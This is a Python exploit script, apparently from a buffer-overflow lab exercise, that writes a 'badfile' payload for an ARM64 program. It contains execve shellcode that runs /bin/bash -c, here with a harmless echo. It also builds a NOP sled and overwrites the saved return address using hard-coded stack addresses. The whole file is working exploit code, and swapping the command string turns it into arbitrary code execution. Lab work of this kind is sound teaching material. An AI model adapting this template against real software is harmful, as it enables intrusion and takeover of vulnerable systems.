#!/usr/bin/python3
import sys

# Shellcode (same as all other tasks)
shellcode = (
    "\x0b\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
    "\x28\x01\x80\xd2\x69\x6a\x28\x38\x88\x01\x80\xd2\x69\x6a\x28\x38"
    "\xe8\x09\x80\xd2\x69\x6a\x28\x38\x08\x0a\x80\xd2\xe9\x03\x13\xaa"
    "\x69\x6a\x28\xf8\x08\x0b\x80\xd2\x49\x01\x80\xd2\xe9\x03\x09\xcb"
    "\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0c\x80\xd2\x09\x02\x80\xd2"
    "\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0d\x80\xd2"
    "\x29\x01\x09\xca\x69\x6a\x28\xf8\xe0\x03\x13\xaa\x61\x42\x01\xb1"
    "\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
    "/bin/bash*"
    "-c****"
    "echo '(^_^) SUCCESS SUCCESS (^_^)'                             *"
    "AAAAAAAA"
    "BBBBBBBB"
    "CCCCCCCC"
    "DDDDDDDD"
).encode('latin-1')

# Fill with NOPs (0xD503201F is NOP instruction in ARM64)
nop = (0xD503201F).to_bytes(4, byteorder='little')
content = bytearray(517)
for offset in range(int(500/4)):
    content[offset*4:offset*4 + 4] = nop

##################################################################
buffer_addr = 0x0000fffffffff170       # ✩ Need to change ✩
foo_frame_pointer = 0x0000fffffffff190 # ✩ Need to change ✩

# Place shellcode in middle of payload (creates NOP sled before it)
shellcode_position = 240
content[shellcode_position:shellcode_position + len(shellcode)] = shellcode

# Return to 517-byte input buffer in main's frame
# The input buffer is ~1200 bytes above bof's buffer
input_buffer_distance = 1200  # ✩ Adjust if needed ✩
ret_addr = buffer_addr + input_buffer_distance

# Calculate offset to return address location
ret_offset = (foo_frame_pointer + 8) - buffer_addr

# Write return address
content[ret_offset:ret_offset + 8] = ret_addr.to_bytes(8, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
